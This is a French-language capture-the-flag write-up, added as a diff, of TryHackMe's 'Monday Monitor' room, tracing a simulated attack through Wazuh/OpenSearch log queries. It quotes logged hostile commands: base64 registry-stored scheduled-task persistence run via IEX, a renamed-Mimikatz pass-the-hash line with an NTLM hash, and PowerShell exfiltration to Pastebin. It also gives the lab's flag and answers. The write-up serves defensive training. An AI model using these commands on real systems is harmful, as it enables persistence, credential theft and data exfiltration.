@@ -1,0 +1,145 @@
+# Monday Monitor — Write-up
+
+**Catégorie** : Forensics / SIEM | **Plateforme** : TryHackMe | **Difficulté** : Easy | **Date** : avril 2026  
+**Outil** : Wazuh + OpenSearch | **Période analysée** : 29 avril 2024, 12:00–20:00 UTC
+
+---
+
+## Contexte
+
+Swiftspend Finance teste son monitoring endpoint via Wazuh. Objectif : reconstituer une chaîne d'attaque complète à partir des logs Windows collectés. Query de départ : `Monday_Monitor`.
+
+---
+
+## Méthodologie
+
+Chaque question correspond à une phase de la kill chain. L'ordre des questions suit naturellement la progression de l'attaquant :
+
+```
+Accès initial → Persistance → Obfuscation → Création compte → Dump credentials → Exfiltration
+```
+
+---
+
+## 1. Accès initial — Fichier téléchargé
+
+```
+data.win.eventdata.commandLine: *Invoke-WebRequest*
+```
+
+Fichier identifié : **`SwiftSpend_Financial_Expenses.xlsm`**
+
+Fichier Excel avec macro (`.xlsm`) — vecteur classique d'accès initial. La macro s'exécute à l'ouverture du fichier.
+
+---
+
+## 2. Persistance — Tâche planifiée
+
+```
+data.win.eventdata.commandLine: *schtasks*
+```
+
+Commande complète récupérée :
+
+```
+"cmd.exe" /c "reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0= /f & schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min "" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st 12:34"
+```
+
+**Heure d'exécution** : `12:34` (daily)
+
+**Mécanisme** : le payload est stocké encodé en base64 dans le registre Windows (`HKCU\SOFTWARE\ATOMIC-T1053.005`), puis lu et exécuté in-memory via `IEX` + `FromBase64String`. Aucun fichier de script sur disque.
+
+---
+
+## 3. Obfuscation — Décodage du payload
+
+```bash
+echo "cGluZyB3d3cueW91YXJldnVsbmVyYWJsZS50aG0=" | base64 -d
+```
+
+```
+ping www.youarevulnerable.thm
+```
+
+Commande de test de connectivité — l'attaquant vérifie que le système peut joindre son infrastructure.
+
+---
+
+## 4. Création de compte — Mot de passe
+
+Première tentative avec syntaxe complexe — échec (Bad Request OpenSearch).
+
+Requête simple qui fonctionne :
+
+```
+full_log: *net user*
+```
+
+**Mot de passe** : `I_AM_M0NIT0R1NG`
+
+Leçon : en cas d'erreur OpenSearch sur une requête complexe, revenir à `full_log` avec un seul terme. Plus fiable que les requêtes multi-champs.
+
+---
+
+## 5. Dump de credentials
+
+```
+data.win.eventdata.commandLine: *sekurlsa*
+```
+
+```
+"cmd.exe" /c "C:\Tools\AtomicRedTeam\atomics\T1003.001\bin\x64\memotech.exe "sekurlsa::pth /user:john.sterling /domain:%userdnsdomain% /ntlm:6963989ca61ef2541bd614609964eabc""
+```
+
+**Exe utilisé** : `memotech.exe` — Mimikatz renommé, technique de living-off-the-land.  
+**Cible** : `john.sterling` — Senior Security Engineer de Swiftspend.  
+**Hash NTLM** : `6963989ca61ef2541bd614609964eabc`  
+**Technique** : Pass-the-Hash via `sekurlsa::pth`
+
+---
+
+## 6. Exfiltration — Flag
+
+```
+full_log: *password*
+```
+
+Événement à `14:56:42` — exfiltration via API Pastebin :
+
+```powershell
+$content = \"secrets, api keys, passwords, THM{M0N1T0R_1$_1N_3FF3CT}, confidential, private...\"
+$url = \"https://pastebin.com/api/api_post.php\"
+$postData = @{ api_dev_key = $apiKey; api_option = \"paste\"; api_paste_code = $content }
+$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData
+```
+
+**Flag** : `THM{M0N1T0R_1$_1N_3FF3CT}`
+
+Exfiltration vers un service légitime (Pastebin) — technique courante pour bypasser les filtres réseau qui bloquent les connexions vers des domaines inconnus.
+
+---
+
+## Récapitulatif
+
+| Phase | Technique | Artefact |
+|---|---|---|
+| Accès initial | Macro Excel | `SwiftSpend_Financial_Expenses.xlsm` |
+| Persistance | Tâche planifiée + registre | `ATOMIC-T1053.005` / `12:34` |
+| Obfuscation | Base64 in-memory | `ping www.youarevulnerable.thm` |
+| Création compte | `net user` | Password: `I_AM_M0NIT0R1NG` |
+| Dump credentials | Mimikatz renommé | `memotech.exe` |
+| Exfiltration | API Pastebin | `THM{M0N1T0R_1$_1N_3FF3CT}` |
+
+---
+
+## Requêtes utiles retenues
+
+```
+data.win.eventdata.commandLine: *schtasks*
+data.win.eventdata.commandLine: *Invoke-WebRequest*
+data.win.eventdata.commandLine: *sekurlsa*
+full_log: *password*
+full_log: *net user*
+```
+
+Quand une requête multi-champs retourne une erreur OpenSearch, simplifier vers `full_log: *terme*` — moins précis mais toujours fonctionnel.
